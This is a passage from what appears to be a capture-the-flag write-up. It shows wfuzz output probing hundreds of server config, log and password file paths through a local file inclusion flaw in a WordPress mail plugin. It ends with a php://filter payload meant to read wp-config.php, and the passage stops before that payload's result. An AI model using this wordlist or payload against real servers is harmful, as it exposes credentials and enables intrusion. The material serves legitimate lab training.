000000631:   500        0 L      0 W        0 Ch        "/usr/local/apache22/conf/httpd.conf"                                                                                                                                      
000000633:   500        0 L      0 W        0 Ch        "/usr/local/apps/apache/conf/httpd.conf"                                                                                                                                   
000000630:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/lighttpd.log"                                                                                                                                     
000000628:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/error_log"                                                                                                                                        
000000629:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/lighttpd.error.log"                                                                                                                               
000000627:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/error.log"                                                                                                                                        
000000621:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/vhosts.conf"                                                                                                                                      
000000625:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/access_log"                                                                                                                                       
000000623:   500        0 L      0 W        0 Ch        "/usr/local/apache2/httpd.conf"                                                                                                                                            
000000622:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/vhosts-custom.conf"                                                                                                                               
000000626:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/audit_log"                                                                                                                                        
000000624:   500        0 L      0 W        0 Ch        "/usr/local/apache2/logs/access.log"                                                                                                                                       
000000618:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/httpd.conf"                                                                                                                                       
000000620:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/ssl.conf"                                                                                                                                         
000000617:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/extra/httpd-ssl.conf"                                                                                                                             
000000615:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/apache.conf"                                                                                                                                      
000000614:   500        0 L      0 W        0 Ch        "/usr/local/apache2/apache2.conf"                                                                                                                                          
000000611:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/mod_jk.log"                                                                                                                                        
000000613:   500        0 L      0 W        0 Ch        "/usr/local/apache2/apache.conf"                                                                                                                                           
000000610:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/lighttpd.log"                                                                                                                                      
000000612:   500        0 L      0 W        0 Ch        "/usr/local/apache1.3/conf/httpd.conf"                                                                                                                                     
000000616:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/apache2.conf"                                                                                                                                     
000000607:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/error.log"                                                                                                                                         
000000609:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/lighttpd.error.log"                                                                                                                                
000000608:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/error_log"                                                                                                                                         
000000604:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/vhosts-custom.conf"                                                                                                                                
000000599:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/apache.conf"                                                                                                                                       
000000606:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/audit_log"                                                                                                                                         
000000602:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/httpd.conf.default"                                                                                                                                
000000605:   500        0 L      0 W        0 Ch        "/usr/local/apache/httpd.conf"                                                                                                                                             
000000600:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/apache2.conf"                                                                                                                                      
000000601:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/httpd.conf"                                                                                                                                        
000000598:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/access.conf"                                                                                                                                       
000000594:   500        0 L      0 W        0 Ch        "/usr/lib/cron/log"                                                                                                                                                        
000000597:   500        0 L      0 W        0 Ch        "/usr/local/apache/apache2.conf"                                                                                                                                           
000000590:   500        0 L      0 W        0 Ch        "/usr/home/user/var/log/apache.log"                                                                                                                                        
000000593:   500        0 L      0 W        0 Ch        "/usr/internet/pgsql/data/postmaster.log"                                                                                                                                  
000000641:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache2/vhosts.conf"                                                                                                                                       
000000596:   500        0 L      0 W        0 Ch        "/usr/local/apache/apache.conf"                                                                                                                                            
000000639:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache2/conf/httpd.conf"                                                                                                                                   
000000592:   500        0 L      0 W        0 Ch        "/usr/internet/pgsql/data/pg_hba.conf"                                                                                                                                     
000000645:   500        0 L      0 W        0 Ch        "/usr/local/etc/httpd/conf/httpd.conf"                                                                                                                                     
000000653:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/conf/context.xml"                                                                                                                          
000000669:   500        0 L      0 W        0 Ch        "/usr/local/lighttpd/log/lighttpd.error.log"                                                                                                                               
000000688:   500        0 L      0 W        0 Ch        "/usr/local/php/apache.conf"                                                                                                                                               
000000687:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/data/postgresql.log"                                                                                                                                     
000000684:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/data/pg_hba.conf"                                                                                                                                        
000000681:   500        0 L      0 W        0 Ch        "/usr/local/nginx/conf/nginx.conf"                                                                                                                                         
000000682:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/bin/pg_passwd"                                                                                                                                           
000000683:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/data/passwd"                                                                                                                                             
000000685:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/data/pg_log"                                                                                                                                             
000000686:   500        0 L      0 W        0 Ch        "/usr/local/pgsql/data/postgresql.conf"                                                                                                                                    
000000680:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysql-slow.log"                                                                                                                                     
000000678:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysql-bin.log"                                                                                                                                      
000000679:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysqlderror.log"                                                                                                                                    
000000675:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysql.err"                                                                                                                                          
000000677:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysql-bin.index"                                                                                                                                    
000000676:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/mysql.log"                                                                                                                                          
000000674:   500        0 L      0 W        0 Ch        "/usr/local/mysql/data/{HOST}.err"                                                                                                                                         
000000673:   500        0 L      0 W        0 Ch        "/usr/local/lsws/logs/error.log"                                                                                                                                           
000000671:   500        0 L      0 W        0 Ch        "/usr/local/logs/samba.log"                                                                                                                                                
000000672:   500        0 L      0 W        0 Ch        "/usr/local/lsws/conf/httpd_conf.xml"                                                                                                                                      
000000670:   500        0 L      0 W        0 Ch        "/usr/local/logs/access.log"                                                                                                                                               
000000667:   500        0 L      0 W        0 Ch        "/usr/local/lighttpd/conf/lighttpd.conf"                                                                                                                                   
000000668:   500        0 L      0 W        0 Ch        "/usr/local/lighttpd/log/access.log"                                                                                                                                       
000000665:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/logs/catalina.out"                                                                                                                              
000000664:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/logs/catalina.err"                                                                                                                              
000000666:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/logs/mod_jk.log"                                                                                                                                
000000661:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/conf/logging.properties"                                                                                                                        
000000663:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/conf/workers.properties"                                                                                                                        
000000660:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/conf/jakarta.conf"                                                                                                                              
000000662:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/conf/server.xml"                                                                                                                                
000000658:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/logs/mod_jk.log"                                                                                                                           
000000657:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/conf/workers.properties"                                                                                                                   
000000659:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/tomcat/conf/context.xml"                                                                                                                               
000000656:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/conf/server.xml"                                                                                                                           
000000654:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/conf/jakarta.conf"                                                                                                                         
000000651:   500        0 L      0 W        0 Ch        "/usr/local/etc/webmin/miniserv.users"                                                                                                                                     
000000650:   500        0 L      0 W        0 Ch        "/usr/local/etc/webmin/miniserv.conf"                                                                                                                                      
000000652:   500        0 L      0 W        0 Ch        "/usr/local/httpd/conf/httpd.conf"                                                                                                                                         
000000649:   500        0 L      0 W        0 Ch        "/usr/local/etc/smb.conf"                                                                                                                                                  
000000655:   500        0 L      0 W        0 Ch        "/usr/local/jakarta/dist/tomcat/conf/logging.properties"                                                                                                                   
000000644:   500        0 L      0 W        0 Ch        "/usr/local/etc/httpd/conf"                                                                                                                                                
000000648:   500        0 L      0 W        0 Ch        "/usr/local/etc/nginx/nginx.conf"                                                                                                                                          
000000647:   500        0 L      0 W        0 Ch        "/usr/local/etc/lighttpd.conf.new"                                                                                                                                         
000000640:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache2/httpd.conf"                                                                                                                                        
000000695:   500        0 L      0 W        0 Ch        "/usr/local/php4/apache2.conf"                                                                                                                                             
000000643:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache22/httpd.conf"                                                                                                                                       
000000642:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache22/conf/httpd.conf"                                                                                                                                  
000000646:   500        0 L      0 W        0 Ch        "/usr/local/etc/lighttpd.conf"                                                                                                                                             
000000691:   500        0 L      0 W        0 Ch        "/usr/local/php/apache2.conf.php"                                                                                                                                          
000000689:   500        0 L      0 W        0 Ch        "/usr/local/php/apache.conf.php"                                                                                                                                           
000000719:   500        0 L      0 W        0 Ch        "/usr/ports/contrib/pure-ftpd/pure-ftpd.conf"                                                                                                                              
000000738:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/conf/logging.properties"                                                                                                                               
000000703:   500        0 L      0 W        0 Ch        "/usr/local/psa/admin/htdocs/domains/databases/phpMyAdmin/libraries/config.default.php"                                                                                    
000000734:   500        0 L      0 W        0 Ch        "/usr/share/squirrelmail/plugins/squirrel_logger/setup.php"                                                                                                                
000000732:   500        0 L      0 W        0 Ch        "/usr/share/logs/catalina.out"                                                                                                                                             
000000733:   500        0 L      0 W        0 Ch        "/usr/share/squirrelmail/config/config.php"                                                                                                                                
000000737:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/conf/context.xml"                                                                                                                                      
000000735:   500        0 L      0 W        0 Ch        "/usr/share/tomcat/logs/catalina.err"                                                                                                                                      
000000731:   500        0 L      0 W        0 Ch        "/usr/share/logs/catalina.err"                                                                                                                                             
000000736:   500        0 L      0 W        0 Ch        "/usr/share/tomcat/logs/catalina.out"                                                                                                                                      
000000728:   500        0 L      0 W        0 Ch        "/usr/sbin/mudlogd"                                                                                                                                                        
000000729:   500        0 L      0 W        0 Ch        "/usr/sbin/mudpasswd"                                                                                                                                                      
000000730:   500        88 L     467 W      3028 Ch     "/usr/share/adduser/adduser.conf"                                                                                                                                          
000000721:   500        0 L      0 W        0 Ch        "/usr/ports/contrib/pure-ftpd/pureftpd.pdb"                                                                                                                                
000000726:   500        0 L      0 W        0 Ch        "/usr/ports/net/pure-ftpd/pureftpd.passwd"                                                                                                                                 
000000724:   500        0 L      0 W        0 Ch        "/usr/ports/ftp/pure-ftpd/pureftpd.pdb"                                                                                                                                    
000000725:   500        0 L      0 W        0 Ch        "/usr/ports/net/pure-ftpd/pure-ftpd.conf"                                                                                                                                  
000000727:   500        0 L      0 W        0 Ch        "/usr/ports/net/pure-ftpd/pureftpd.pdb"                                                                                                                                    
000000722:   500        0 L      0 W        0 Ch        "/usr/ports/ftp/pure-ftpd/pure-ftpd.conf"                                                                                                                                  
000000723:   500        0 L      0 W        0 Ch        "/usr/ports/ftp/pure-ftpd/pureftpd.passwd"                                                                                                                                 
000000718:   500        0 L      0 W        0 Ch        "/usr/pkgsrc/net/pureftpd/pureftpd.pdb"                                                                                                                                    
000000717:   500        0 L      0 W        0 Ch        "/usr/pkgsrc/net/pureftpd/pureftpd.passwd"                                                                                                                                 
000000720:   500        0 L      0 W        0 Ch        "/usr/ports/contrib/pure-ftpd/pureftpd.passwd"                                                                                                                             
000000714:   500        0 L      0 W        0 Ch        "/usr/pkg/etc/httpd/httpd-default.conf"                                                                                                                                    
000000715:   500        0 L      0 W        0 Ch        "/usr/pkg/etc/httpd/httpd-vhosts.conf"                                                                                                                                     
000000711:   500        0 L      0 W        0 Ch        "/usr/local/zeus/web/global.cfg"                                                                                                                                           
000000710:   500        0 L      0 W        0 Ch        "/usr/local/squirrelmail/www/README"                                                                                                                                       
000000712:   500        0 L      0 W        0 Ch        "/usr/local/zeus/web/log/errors"                                                                                                                                           
000000716:   500        0 L      0 W        0 Ch        "/usr/pkgsrc/net/pureftpd/pure-ftpd.conf"                                                                                                                                  
000000713:   500        0 L      0 W        0 Ch        "/usr/pkg/etc/httpd/httpd.conf"                                                                                                                                            
000000709:   500        0 L      0 W        0 Ch        "/usr/local/sb/config"                                                                                                                                                     
000000708:   500        0 L      0 W        0 Ch        "/usr/local/samba/lib/smb.conf.user"                                                                                                                                       
000000707:   500        0 L      0 W        0 Ch        "/usr/local/samba/lib/log.user"                                                                                                                                            
000000706:   500        0 L      0 W        0 Ch        "/usr/local/pureftpd/etc/pureftpd.pdb"                                                                                                                                     
000000705:   500        0 L      0 W        0 Ch        "/usr/local/psa/admin/logs/panel.log"                                                                                                                                      
000000702:   500        0 L      0 W        0 Ch        "/usr/local/psa/admin/conf/site_isolation_settings.ini"                                                                                                                    
000000700:   500        0 L      0 W        0 Ch        "/usr/local/php5/apache2.conf.php"                                                                                                                                         
000000704:   500        0 L      0 W        0 Ch        "/usr/local/psa/admin/logs/httpsd_access_log"                                                                                                                              
000000699:   500        0 L      0 W        0 Ch        "/usr/local/php5/apache2.conf"                                                                                                                                             
000000701:   500        0 L      0 W        0 Ch        "/usr/local/psa/admin/conf/php.ini"                                                                                                                                        
000000697:   500        0 L      0 W        0 Ch        "/usr/local/php5/apache.conf"                                                                                                                                              
000000694:   500        0 L      0 W        0 Ch        "/usr/local/php4/apache.conf.php"                                                                                                                                          
000000698:   500        0 L      0 W        0 Ch        "/usr/local/php5/apache.conf.php"                                                                                                                                          
000000696:   500        0 L      0 W        0 Ch        "/usr/local/php4/apache2.conf.php"                                                                                                                                         
000000741:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/logs/catalina.err"                                                                                                                                     
000000693:   500        0 L      0 W        0 Ch        "/usr/local/php4/apache.conf"                                                                                                                                              
000000745:   500        0 L      0 W        0 Ch        "/var/adm/acct/sum/loginlog"                                                                                                                                               
000000690:   500        0 L      0 W        0 Ch        "/usr/local/php/apache2.conf"                                                                                                                                              
000000692:   500        0 L      0 W        0 Ch        "/usr/local/php/httpd.conf.php"                                                                                                                                            
000000739:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/conf/server.xml"                                                                                                                                       
000000753:   500        0 L      0 W        0 Ch        "/var/adm/log/asppp.log"                                                                                                                                                   
000000769:   500        0 L      0 W        0 Ch        "/var/apache/conf/httpd.conf"                                                                                                                                              
000000788:   500        0 L      0 W        0 Ch        "/var/log/ipfw"                                                                                                                                                            
000000785:   500        0 L      0 W        0 Ch        "/var/log/error.log"                                                                                                                                                       
000000784:   500        0 L      0 W        0 Ch        "/var/log/data/mysql-bin.index"                                                                                                                                            
000000783:   500        0 L      0 W        0 Ch        "/var/log/daemon.log.1"                                                                                                                                                    
000000787:   500        0 L      0 W        0 Ch        "/var/log/exim/paniclog"                                                                                                                                                   
000000782:   500        0 L      0 W        0 Ch        "/var/log/cron/var/log/postgres.log"                                                                                                                                       
000000786:   500        0 L      0 W        0 Ch        "/var/log/error_log"                                                                                                                                                       
000000781:   500        0 L      0 W        0 Ch        "/var/log/boot.log"                                                                                                                                                        
000000780:   500        0 L      0 W        0 Ch        "/var/log/authlog"                                                                                                                                                         
000000779:   500        0 L      0 W        0 Ch        "/var/log/apache2/squirrelmail.log"                                                                                                                                        
000000778:   500        0 L      0 W        0 Ch        "/var/log/apache2/squirrelmail.err.log"                                                                                                                                    
000000776:   500        0 L      0 W        0 Ch        "/var/log/access.log"                                                                                                                                                      
000000773:   500        0 L      0 W        0 Ch        "/var/lib/pgsql/data/postgresql.conf"                                                                                                                                      
000000777:   500        0 L      0 W        0 Ch        "/var/log/access_log"                                                                                                                                                      
000000774:   500        0 L      0 W        0 Ch        "/var/lib/squirrelmail/prefs/squirrelmail.log"                                                                                                                             
000000772:   500        0 L      0 W        0 Ch        "/var/data/mysql-bin.index"                                                                                                                                                
000000771:   500        0 L      0 W        0 Ch        "/var/cron/log"                                                                                                                                                            
000000775:   500        0 L      0 W        0 Ch        "/var/lighttpd.log"                                                                                                                                                        
000000768:   500        0 L      0 W        0 Ch        "/var/adm/X0msgs"                                                                                                                                                          
000000770:   500        0 L      0 W        0 Ch        "/var/cpanel/tomcat.options"                                                                                                                                               
000000767:   500        0 L      0 W        0 Ch        "/var/adm/wtmpx"                                                                                                                                                           
000000762:   500        0 L      0 W        0 Ch        "/var/adm/SYSLOG"                                                                                                                                                          
000000760:   500        0 L      0 W        0 Ch        "/var/adm/ras/errlog"                                                                                                                                                      
000000764:   500        0 L      0 W        0 Ch        "/var/adm/utmpx"                                                                                                                                                           
000000763:   500        0 L      0 W        0 Ch        "/var/adm/utmp"                                                                                                                                                            
000000765:   500        0 L      0 W        0 Ch        "/var/adm/vold.log"                                                                                                                                                        
000000766:   500        0 L      0 W        0 Ch        "/var/adm/wtmp"                                                                                                                                                            
000000761:   500        0 L      0 W        0 Ch        "/var/adm/sulog"                                                                                                                                                           
000000757:   500        0 L      0 W        0 Ch        "/var/adm/pacct"                                                                                                                                                           
000000759:   500        0 L      0 W        0 Ch        "/var/adm/ras/bootlog"                                                                                                                                                     
000000758:   500        0 L      0 W        0 Ch        "/var/adm/qacct"                                                                                                                                                           
000000756:   500        0 L      0 W        0 Ch        "/var/adm/messages"                                                                                                                                                        
000000752:   500        0 L      0 W        0 Ch        "/var/adm/lastlog/username"                                                                                                                                                
000000755:   500        0 L      0 W        0 Ch        "/var/adm/lp/lpd-errs"                                                                                                                                                     
000000754:   500        0 L      0 W        0 Ch        "/var/adm/loginlog"                                                                                                                                                        
000000749:   500        0 L      0 W        0 Ch        "/var/adm/crash/vmcore"                                                                                                                                                    
000000751:   500        0 L      0 W        0 Ch        "/var/adm/dtmp"                                                                                                                                                            
000000750:   500        0 L      0 W        0 Ch        "/var/adm/cron/log"                                                                                                                                                        
000000748:   500        0 L      0 W        0 Ch        "/var/adm/crash/unix"                                                                                                                                                      
000000744:   500        0 L      0 W        0 Ch        "/usr/spool/mqueue/syslog"                                                                                                                                                 
000000747:   500        0 L      0 W        0 Ch        "/var/adm/aculogs"                                                                                                                                                         
000000746:   500        0 L      0 W        0 Ch        "/var/adm/aculog"                                                                                                                                                          
000000740:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/conf/workers.properties"                                                                                                                               
000000743:   500        0 L      0 W        0 Ch        "/usr/spool/lp/log"                                                                                                                                                        
000000742:   500        0 L      0 W        0 Ch        "/usr/share/tomcat6/logs/catalina.out"                                                                                                                                     
000000791:   500        0 L      0 W        0 Ch        "/var/log/ipfw/ipfw.log"                                                                                                                                                   
000000789:   500        0 L      0 W        0 Ch        "/var/log/ipfw.log"                                                                                                                                                        
000000795:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/"                                                                                                                                                       
000000803:   500        0 L      0 W        0 Ch        "/var/log/muddleftpd"                                                                                                                                                      
000000819:   500        0 L      0 W        0 Ch        "/var/log/nginx/access_log"                                                                                                                                                
000000838:   500        0 L      0 W        0 Ch        "/var/log/proftpd.access_log"                                                                                                                                              
000000836:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql-9.0-main.log"                                                                                                                              
000000835:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql-8.4-main.log"                                                                                                                              
000000837:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql-9.1-main.log"                                                                                                                              
000000834:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql-8.3-main.log"                                                                                                                              
000000832:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql.log"                                                                                                                                       
000000831:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgres.log"                                                                                                                                         
000000833:   500        0 L      0 W        0 Ch        "/var/log/postgresql/postgresql-8.1-main.log"                                                                                                                              
000000830:   500        0 L      0 W        0 Ch        "/var/log/postgresql/main.log"                                                                                                                                             
000000829:   500        0 L      0 W        0 Ch        "/var/log/postgresql.log"                                                                                                                                                  
000000828:   500        0 L      0 W        0 Ch        "/var/log/postgres/postgres.log"                                                                                                                                           
000000827:   500        0 L      0 W        0 Ch        "/var/log/postgres/pg_backup.log"                                                                                                                                          
000000826:   500        0 L      0 W        0 Ch        "/var/log/POPlog"                                                                                                                                                          
000000825:   500        0 L      0 W        0 Ch        "/var/log/pm-powersave.log"                                                                                                                                                
000000824:   500        0 L      0 W        0 Ch        "/var/log/pgsql8.log"                                                                                                                                                      
000000821:   500        0 L      0 W        0 Ch        "/var/log/nginx/error_log"                                                                                                                                                 
000000822:   500        0 L      0 W        0 Ch        "/var/log/pgsql/pgsql.log"                                                                                                                                                 
000000823:   500        0 L      0 W        0 Ch        "/var/log/pgsql_log"                                                                                                                                                       
000000818:   500        0 L      0 W        0 Ch        "/var/log/nginx/access.log"                                                                                                                                                
000000820:   500        0 L      0 W        0 Ch        "/var/log/nginx/error.log"                                                                                                                                                 
000000817:   500        0 L      0 W        0 Ch        "/var/log/nginx.error_log"                                                                                                                                                 
000000816:   500        0 L      0 W        0 Ch        "/var/log/nginx.access_log"                                                                                                                                                
000000813:   500        0 L      0 W        0 Ch        "/var/log/news/news.notice"                                                                                                                                                
000000814:   500        0 L      0 W        0 Ch        "/var/log/news/suck.err"                                                                                                                                                   
000000815:   500        0 L      0 W        0 Ch        "/var/log/news/suck.notice"                                                                                                                                                
000000812:   500        0 L      0 W        0 Ch        "/var/log/news/news.err"                                                                                                                                                   
000000810:   500        0 L      0 W        0 Ch        "/var/log/news/news.all"                                                                                                                                                   
000000811:   500        0 L      0 W        0 Ch        "/var/log/news/news.crit"                                                                                                                                                  
000000809:   500        0 L      0 W        0 Ch        "/var/log/news.all"                                                                                                                                                        
000000808:   500        0 L      0 W        0 Ch        "/var/log/mysql-bin.index"                                                                                                                                                 
000000807:   500        0 L      0 W        0 Ch        "/var/log/mysql/mysql-bin.index"                                                                                                                                           
000000806:   500        0 L      0 W        0 Ch        "/var/log/mysql/data/mysql-bin.index"                                                                                                                                      
000000805:   500        0 L      0 W        0 Ch        "/var/log/mysql.err"                                                                                                                                                       
000000802:   500        0 L      0 W        0 Ch        "/var/log/messages.1"                                                                                                                                                      
000000804:   500        0 L      0 W        0 Ch        "/var/log/muddleftpd.conf"                                                                                                                                                 
000000800:   500        0 L      0 W        0 Ch        "/var/log/log.smb"                                                                                                                                                         
000000801:   500        0 L      0 W        0 Ch        "/var/log/mail.err"                                                                                                                                                        
000000799:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/error.www.log"                                                                                                                                          
000000798:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/access.www.log"                                                                                                                                         
000000797:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/{DOMAIN}/error.log"                                                                                                                                     
000000794:   500        0 L      0 W        0 Ch        "/var/log/lighttpd.error.log"                                                                                                                                              
000000796:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/{DOMAIN}/access.log"                                                                                                                                    
000000792:   500        0 L      0 W        0 Ch        "/var/log/kern.log.1"                                                                                                                                                      
000000790:   500        0 L      0 W        0 Ch        "/var/log/ipfw.today"                                                                                                                                                      
000000793:   500        0 L      0 W        0 Ch        "/var/log/lighttpd.access.log"                                                                                                                                             
000000839:   500        0 L      0 W        0 Ch        "/var/log/proftpd.xferlog"                                                                                                                                                 
000000841:   500        0 L      0 W        0 Ch        "/var/log/samba.log"                                                                                                                                                       
000000845:   500        0 L      0 W        0 Ch        "/var/log/samba/log.smbd"                                                                                                                                                  
000000853:   500        0 L      0 W        0 Ch        "/var/log/user.log"                                                                                                                                                        
000000868:   500        0 L      0 W        0 Ch        "/var/saf/port/log"                                                                                                                                                        
000000869:   500        0 L      0 W        0 Ch        "/var/www/.lighttpdpassword"                                                                                                                                               
000000879:   500        0 L      0 W        0 Ch        "/www/logs/freebsddiary-error.log"                                                                                                                                         
000000880:   500        0 L      0 W        0 Ch        "/www/logs/proftpd.system.log"                                                                                                                                             
000000878:   500        0 L      0 W        0 Ch        "/www/logs/freebsddiary-access_log"                                                                                                                                        
000000875:   500        0 L      0 W        0 Ch        "/web/conf/php.ini"                                                                                                                                                        
000000877:   500        0 L      0 W        0 Ch        "/www/conf/httpd.conf"                                                                                                                                                     
000000874:   500        0 L      0 W        0 Ch        "/var/www/squirrelmail/config/config.php"                                                                                                                                  
000000876:   500        0 L      0 W        0 Ch        "/www/apache/conf/httpd.conf"                                                                                                                                              
000000873:   500        0 L      0 W        0 Ch        "/var/www/html/squirrelmail-1.2.9/config/config.php"                                                                                                                       
000000872:   500        0 L      0 W        0 Ch        "/var/www/html/squirrelmail/config/config.php"                                                                                                                             
000000871:   500        0 L      0 W        0 Ch        "/var/www/conf/httpd.conf"                                                                                                                                                 
000000870:   500        0 L      0 W        0 Ch        "/var/www/conf"                                                                                                                                                            
000000852:   500        0 L      0 W        0 Ch        "/var/log/ufw.log"                                                                                                                                                         
000000867:   500        0 L      0 W        0 Ch        "/var/saf/_log"                                                                                                                                                            
000000865:   500        0 L      0 W        0 Ch        "/var/postgresql/db/postgresql.conf"                                                                                                                                       
000000866:   500        0 L      0 W        0 Ch        "/var/postgresql/log/postgresql.log"                                                                                                                                       
000000864:   500        0 L      0 W        0 Ch        "/var/nm2/postgresql.conf"                                                                                                                                                 
000000863:   500        0 L      0 W        0 Ch        "/var/mysql-bin.index"                                                                                                                                                     
000000862:   500        0 L      0 W        0 Ch        "/var/lp/logs/requests"                                                                                                                                                    
000000861:   500        0 L      0 W        0 Ch        "/var/lp/logs/lpsched"                                                                                                                                                     
000000860:   500        0 L      0 W        0 Ch        "/var/lp/logs/lpNet"                                                                                                                                                       
000000858:   500        0 L      0 W        0 Ch        "/var/log/Xorg.0.log"                                                                                                                                                      
000000859:   500        0 L      0 W        0 Ch        "/var/logs/access.log"                                                                                                                                                     
000000856:   500        0 L      0 W        0 Ch        "/var/log/vmware/hostd-1.log"                                                                                                                                              
000000854:   500        0 L      0 W        0 Ch        "/var/log/user.log.1"                                                                                                                                                      
000000844:   500        0 L      0 W        0 Ch        "/var/log/samba/log.nmbd"                                                                                                                                                  
000000855:   500        0 L      0 W        0 Ch        "/var/log/vmware/hostd.log"                                                                                                                                                
000000857:   500        0 L      0 W        0 Ch        "/var/log/webmin/miniserv.log"                                                                                                                                             
000000850:   500        0 L      0 W        0 Ch        "/var/log/syslog.1"                                                                                                                                                        
000000851:   500        0 L      0 W        0 Ch        "/var/log/tomcat6/catalina.out"                                                                                                                                            
000000849:   500        0 L      0 W        0 Ch        "/var/log/syslog"                                                                                                                                                          
000000848:   500        0 L      0 W        0 Ch        "/var/log/sw-cp-server/error_log"                                                                                                                                          
000000842:   500        0 L      0 W        0 Ch        "/var/log/samba.log1"                                                                                                                                                      
000000846:   500        0 L      0 W        0 Ch        "/var/log/squirrelmail.log"                                                                                                                                                
000000840:   500        0 L      0 W        0 Ch        "/var/log/proftpd/xferlog.legacy"                                                                                                                                          
000000843:   500        0 L      0 W        0 Ch        "/var/log/samba.log2"                                                                                                                                                      
000000847:   500        0 L      0 W        0 Ch        "/var/log/sso/sso.log"                                                                                                                                                     

Total time: 17.00171
Processed Requests: 880
Filtered Requests: 0
Requests/sec.: 51.75947
```

Couple of interesting things, but nothing gave results.

Let's try some LFI filters from [1]:

```
10.10.97.156/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=PHP://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

We found earlier from the `/etc/passwd` that the webserver is running from `/var/www/`, most likely `/var/www/html`, and wordpress is in a `wordpress` subdirectory. We know that in wordpress `wp-config.php` is at the root.

We get:

```
